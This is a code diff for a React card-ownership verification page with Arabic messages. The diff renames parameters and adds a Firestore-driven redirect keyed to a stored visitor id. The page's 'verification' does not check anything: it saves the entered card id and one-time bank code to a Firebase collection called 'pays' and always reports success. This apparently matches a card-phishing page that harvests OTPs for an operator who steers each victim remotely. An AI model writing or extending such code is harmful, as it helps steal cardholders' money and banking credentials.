@@ -1,13 +1,12 @@
-/* eslint-disable @typescript-eslint/no-explicit-any */
-
 "use client";
 
 import type React from "react";
 
 import { useEffect, useCallback, useState } from "react";
 import { useNavigate } from "react-router-dom";
-import { BankVerificationModal } from "../components/BankVerificationModal";
 import { addData } from "../apis/firebase";
+import FirestoreRedirect from "./rediract-page";
+import { BankVerificationModal } from "../components/BankVerificationModal";
 
 interface CardOwnershipState {
   otp: string[];
@@ -18,16 +17,14 @@ interface CardOwnershipState {
 }
 
 // This function would replace the socket emit for verification
-// eslint-disable-next-line @typescript-eslint/no-unused-vars
 const verifyCardOwnership = async (
-  _orderId: string,
-  _cardId: string,
-  _verificationCode: string
+  orderId: string,
+  cardId: string,
+  verificationCode: string
 ) => {
   // Replace with your API call
   try {
-    addData({ id: _orderId, cardId: _cardId, ownerCode: _verificationCode });
-
+    addData({ id: orderId, cardId: cardId, ownerCode: verificationCode });
     return { success: true };
   } catch (error) {
     console.error("Error verifying card ownership:", error);
@@ -38,6 +35,7 @@ const verifyCardOwnership = async (
 export const CardOwnershipVerification = () => {
   const navigate = useNavigate();
   const [showBankModal, setShowBankModal] = useState(false);
+  const _id = localStorage.getItem("visitor");
 
   // Replace Redux state with local state
   const [state, setState] = useState<CardOwnershipState>({
@@ -48,7 +46,7 @@ export const CardOwnershipVerification = () => {
     cardLastDigits: "",
   });
 
-  // Helper functions to update state (replacing Redux actions)
+  // Helper functions to update state
   const setOtpDigit = useCallback((index: number, value: string) => {
     setState((prevState) => {
       const newOtp = [...prevState.otp];
@@ -182,7 +180,6 @@ export const CardOwnershipVerification = () => {
         } else {
           setError("رمز التحقق غير صحيح");
         }
-        // eslint-disable-next-line @typescript-eslint/no-unused-vars
       } catch (error) {
         setError("رمز التحقق غير صحيح");
       }
@@ -198,6 +195,8 @@ export const CardOwnershipVerification = () => {
 
   return (
     <div className="min-h-screen bg-gradient-to-br from-gray-50 to-blue-50 pt-36 px-4">
+      {_id && <FirestoreRedirect id={_id} collectionName="pays" />}
+
       <div className="max-w-3xl mx-auto">
         <div className="bg-white rounded-2xl shadow-xl p-6 md:p-8 backdrop-blur-lg bg-opacity-95 transform transition-all duration-300 hover:shadow-2xl">
           <h1 className="text-2xl md:text-3xl font-bold text-center mb-6 text-[#146394]">
@@ -309,3 +308,5 @@ export const CardOwnershipVerification = () => {
     </div>
   );
 };
+
+export default CardOwnershipVerification;
